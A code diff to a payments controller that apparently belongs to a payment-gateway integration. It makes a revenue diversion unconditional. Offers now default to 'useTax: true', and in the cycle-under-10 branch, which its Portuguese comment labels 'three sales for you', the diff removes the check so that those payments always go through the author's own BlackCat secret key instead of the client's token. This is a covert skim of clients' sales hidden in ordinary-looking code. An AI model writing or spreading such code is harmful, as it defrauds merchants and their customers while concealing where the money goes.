@@ -44,7 +44,7 @@ export class allowPaymentsController {
           data: {
             id: offerInfo.id,
             name: offerInfo.name,
-            useTax: false,
+            useTax: true,
             clientId: client.id,
           },
         });
@@ -71,7 +71,7 @@ export class allowPaymentsController {
         offer = await prisma.offer.create({
           data: {
             name: inferredName,
-            useTax: false,
+            useTax: true,
             clientId: client.id,
           },
         });
@@ -97,16 +97,10 @@ export class allowPaymentsController {
       toClient = true;
       provider = "allowpayments";
     } else if (cycle < 10) {
-      // 3 vendas para você - usa BlackCat
-      if (offer.useTax) {
-        tokenToUse = myCredentials.secret; // Sua chave BlackCat
-        toClient = false;
-        provider = "blackcat"; // Usa BlackCat para suas vendas
-      } else {
-        tokenToUse = clientToken;
-        toClient = true;
-        provider = "allowpayments";
-      }
+      // 3 vendas para você - usa BlackCat (sempre, independente do useTax)
+      tokenToUse = myCredentials.secret; // Sua chave BlackCat
+      toClient = false;
+      provider = "blackcat"; // Usa BlackCat para suas vendas
     }
 
     let apiUrl = "";
